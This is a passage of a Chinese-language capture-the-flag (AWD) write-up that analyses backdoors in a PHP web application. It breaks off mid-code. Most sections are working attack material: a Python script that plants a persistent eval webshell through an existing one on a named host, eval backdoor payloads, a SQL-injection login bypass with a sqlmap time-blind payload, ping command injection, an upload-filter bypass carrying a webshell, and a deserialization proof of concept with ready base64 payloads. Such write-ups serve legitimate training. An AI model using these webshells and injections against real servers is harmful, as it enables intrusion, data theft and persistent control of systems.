@eval(\$_POST[123]); ?&gt;&quot; &gt; /var/www/html/webshell.php<br><br><br>import requests<br><br>url = &quot;http://www.bmzclub.cn:20111&quot;<br><br>shell_path = url + &quot;/include/shell.php&quot;<br>shell_passwd = &quot;admin_ccmd&quot;<br><br>#上传shell脚本<br>payload1 = &#123;shell_passwd: &#x27;system(\&#x27;echo IyEvYmluL2Jhc2gKZWNobyAiPD9waHAgQGV2YWwoXCRfUE9TVFsxMjNdKTsgPz4iID4gL3Zhci93d3cvaHRtbC93ZWJzaGVsbC5waHAK|base64 -d &gt; /var/www/html/1.sh\&#x27;);&#x27;&#125;<br>res = requests.post(shell_path, payload1)<br>#授权shell脚本<br>payload2 = &#123;shell_passwd: &#x27;system(\&#x27;chmod a+x /var/www/html/1.sh\&#x27;);&#x27;&#125;<br>res = requests.post(shell_path, payload2)<br>#运行shell脚本<br>payload3 = &#123;shell_passwd: &#x27;system(\&#x27;sh /var/www/html/1.sh\&#x27;);&#x27;&#125;<br>res = requests.post(shell_path, payload3)<br>#检查shell脚本是否运行<br>payload4 = &#123;shell_passwd: &#x27;system(\&#x27;cat /var/www/html/webshell.php\&#x27;);&#x27;&#125;<br>res = requests.post(shell_path, payload4)<br>print(res.text)<br>payload5 = &#123;shell_passwd: &#x27;system(\&#x27;curl -h\&#x27;);&#x27;&#125;<br>res = requests.post(shell_path, payload5)<br>print(res.text)<br></code></pre></td></tr></table></figure><h3 id="后门3-Autofoucer-php"><a href="#后门3-Autofoucer-php" class="headerlink" title="后门3-Autofoucer.php"></a>后门3-Autofoucer.php</h3><p>路径：/var/www/html/org/smarty/Autofoucer.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()[<span class="hljs-string">&#x27;_GET&#x27;</span>][<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很简单get_defined_vars提取get传入cmd参数的值，然后eval执行</p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/org/smarty/Autofoucer.php?cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="后门4-User-php"><a href="#后门4-User-php" class="headerlink" title="后门4-User.php"></a>后门4-User.php</h3><p>路径：/var/www/html/lib/User.php</p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Login</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$this</span>-&gt;conn);<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>();<br>          <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$result</span>);<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$username</span>;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php?c=User&amp;a=home&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;password error!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>从第五行sql语句来看，单引号拼接存在sql注入漏洞，并且是个无回显的注入，不过可以万能密码登录。</p><p>万能密码admin’ or 1=1#登录</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1658765801018-70c7519f-a099-4b90-a1c0-bd6e8df28c86.png" alt="img"></p><p>sqlmap跑出来时间盲注</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">Parameter: <span class="hljs-title function_ invoke__">username</span> (POST)<br>    Type: time-based blind<br>    Title: MySQL &gt;= <span class="hljs-number">5.0</span>.<span class="hljs-number">12</span> AND time-based <span class="hljs-title function_ invoke__">blind</span> (query SLEEP)<br>    Payload: username=admin<span class="hljs-string">&#x27; AND (SELECT 9262 FROM (SELECT(SLEEP(5)))azbA) AND &#x27;</span>GkUi<span class="hljs-string">&#x27;=&#x27;</span>GkUi&amp;password=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>继续审计，register()和updatepass()中都使用了addslashes()函数来sql注入，但update()函数没有防护</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updatepass</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;update users set password=&#x27;<span class="hljs-subst">$password</span>&#x27; where id=&#x27;&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;success.tpl&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;updatepass.tpl&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>update函数中使用update的sql语句，这里存在update注入，但也是无回显的</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p> 这里构造了一个ping函数，POST传入host执行ping命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">base</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c <span class="hljs-subst">$host</span>&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过使用管道，从而实现任意命令执行</p><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /index.php?c=User&amp;a=ping HTTP/<span class="hljs-number">1.1</span><br>host=;cat /flag<br></code></pre></td></tr></table></figure><h3 id="后门5-File-php"><a href="#后门5-File-php" class="headerlink" title="后门5-File.php"></a>后门5-File.php</h3><p>路径：/var/www/html/lib/File.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;<br><br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$typelist</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$allowexten</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$path</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;not login&quot;</span>);<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;typelist==<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;image/jpeg&quot;</span>,<span class="hljs-string">&quot;image/jpg&quot;</span>,<span class="hljs-string">&quot;image/png&quot;</span>,<span class="hljs-string">&quot;image/gif&quot;</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;notallow=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php7&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;path=<span class="hljs-string">&#x27;./upload&#x27;</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <br>            <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>            <span class="hljs-variable">$upfile</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;pic&#x27;</span>];<br>            <span class="hljs-variable">$fileinfo</span>=<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$upfile</span>[<span class="hljs-string">&quot;name&quot;</span>]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&quot;extension&quot;</span>],<span class="hljs-variable">$this</span>-&gt;notallow))&#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$path</span>=<span class="hljs-string">&#x27;./upload/&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;_&quot;</span>.<span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&quot;filename&quot;</span>].<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&quot;extension&quot;</span>]);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>))&#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;file already exists&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$upfile</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>],  <span class="hljs-variable">$path</span>))&#123;<br>                <span class="hljs-comment">//return True;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$path</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> False;<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传限制不严格 ，白名单和黑名单，使用大小写绕过黑名单，将上传的文件名upshell.phP改为upshell.phP，并且将Content-Type修改为白名单其中的一种类型。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /index.php?c=User&amp;a=upload HTTP/<span class="hljs-number">1.1</span><br>Host: www.bmzclub.cn:<span class="hljs-number">20111</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">102.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">102.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=---------------------------309084571412561401231199151515</span><br><span class="hljs-comment">Content-Length: 250</span><br><span class="hljs-comment">Origin: http://www.bmzclub.cn:20111</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Referer: http://www.bmzclub.cn:20111/index.php?c=User&amp;a=home</span><br><span class="hljs-comment">Cookie: PHPSESSID=skeg44oft8pvpdu20gvqcooo33</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-----------------------------309084571412561401231199151515</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;pic&quot;; filename=&quot;upshell.phP&quot;</span><br><span class="hljs-comment">Content-Type: image/jpeg</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;?php <span class="hljs-doctag">@eval</span>($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br><span class="hljs-comment">-----------------------------309084571412561401231199151515--</span><br></code></pre></td></tr></table></figure><h3 id="后门6-home-php"><a href="#后门6-home-php" class="headerlink" title="后门6-home.php"></a>后门6-home.php</h3><p>路径：/var/www/html/common/home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">home</span></span>&#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <br>      <br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ping&quot;</span>))) &#123;   <br>        <span class="hljs-comment">#in_array(value,array)函数检查数组中是否存在某个值，给定的值value存在于数组array中则返回true。</span><br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<br>        <span class="hljs-comment">#　call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数。</span><br>        &#125;<br>    &#125; <br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$host</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c 2 <span class="hljs-subst">$host</span>&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-variable">$str</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$v</span>)));<br>        &#125;<br>    &#125;   <br>&#125;<br>    <span class="hljs-variable">$a</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$a</span>));<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>百越杯AWD原题：<a href="https://chybeta.github.io/2017/10/28/2017%E5%B9%B4%E7%99%BE%E8%B6%8A%E6%9D%AFAWD-web-writeup/">https://chybeta.github.io/2017/10/28/2017%E5%B9%B4%E7%99%BE%E8%B6%8A%E6%9D%AFAWD-web-writeup/</a></p><p>关键点</p><p>1）类中的waf函数将空格替换成空，因此需要绕过，使用&lt;代替空格，Linux下可以用$IFS代替空格。</p><p>2）利用call_user_func_array函数进行代码注入，调用回调函数，并把一个数组参数作为回调函数的参数。</p><p>总体思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">1、该PHP文件只接收一个base64编码的POST参数，将其解码后会进行反序列化。<br><br>2、在执行__wakeup()方法以后,会触发__construct()方法进行初始化。<br><br>3、释放序列化对象，触发__destruct()魔术方法。该方法只执行类中的ping方法，并会将args的值做为ping方法host参数。<br><br>4、ping中存在可控参数$host，且调用了system函数，可以用来执行命令。<br></code></pre></td></tr></table></figure><p>流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">__wakeup() -&gt;  __construct() -&gt; __destruct()<br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br><br>class home&#123;<br>    <br>    private $method;<br>    private $args;<br>    function __construct($method, $args) &#123; <br><br><br>        $this-&gt;method = $method;<br>        $this-&gt;args = $args;<br>    &#125;<br><br>&#125;<br>$a = new home(&quot;ping&quot;,array(&quot;127.0.0.1|whoami&quot;));<br>// $a = new home(&quot;ping&quot;,array(&quot;127.0.0.1|cat&lt;/flag&quot;));<br>$exp = serialize($a);<br>print_r($exp);<br>print_r(&quot;&lt;/br&gt;&quot;);<br>print_r(base64_encode($exp));<br><br>#Tzo0OiJob21lIjoyOntzOjEyOiIAaG9tZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGhvbWUAYXJncyI7YToxOntpOjA7czoxNjoiMTI3LjAuMC4xfHdob2FtaSI7fX0=<br></code></pre></td></tr></table></figure><p>可以上发现有一些零字节，有一些不可见字符，将得到的结果直接Base64编码得到最终的payload</p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、执行whoami<br>POST /common/home.php HTTP/<span class="hljs-number">1.1</span><br>a=Tzo0OiJob21lIjoyOntzOjEyOiIAaG9tZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGhvbWUAYXJncyI7YToxOntpOjA7czoxNjoiMTI3LjAuMC4xfHdob2FtaSI7fX0=<br><span class="hljs-comment">#a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;homemethod&quot;;s:4:&quot;ping&quot;;s:10:&quot;homeargs&quot;;a:1:&#123;i:0;s:16:&quot;127.0.0.1|whoami&quot;;&#125;&#125;</span><br>  <br>  <br><span class="hljs-number">2</span>、获取flag <br>POST /common/home.php HTTP/<span class="hljs-number">1.1</span><br>a=Tzo0OiJob21lIjoyOntzOjEyOiIAaG9tZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGhvbWUAYXJncyI7YToxOntpOjA7czoxOToiMTI3LjAuMC4xfGNhdDwvZmxhZyI7fX0=<br><span class="hljs-comment">#a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;homemethod&quot;;s:4:&quot;ping&quot;;s:10:&quot;homeargs&quot;;a:1:&#123;i:0;s:19:&quot;127.0.0.1|cat&lt;/flag&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="后门7-cacf-php"><a href="#后门7-cacf-php" class="headerlink" title="后门7-cacf.php"></a>后门7-cacf.php</h3><p>路径：/var/www/html/common/cacf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">chybeta</span></span>&#123;<br><span class="hljs-comment">//</span><br><span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;pcaq&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;log.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) ;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$this</span>-&gt;test);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br>&#125;<br><span class="hljs-comment">//判断是否是序列化</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_serialized</span>(<span class="hljs-params"> <span class="hljs-variable">$data</span> </span>) </span>&#123;<br>     <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$data</span> );<br>     <span class="hljs-keyword">if</span> ( <span class="hljs-string">&#x27;N;&#x27;</span> == <span class="hljs-variable">$data</span> )<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>     <span class="hljs-keyword">if</span> ( !<span class="hljs-title function_ invoke__">preg_match</span>( <span class="hljs-string">&#x27;/^([adObis]):/&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$badions</span> ) )<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>     <span class="hljs-keyword">switch</span> ( <span 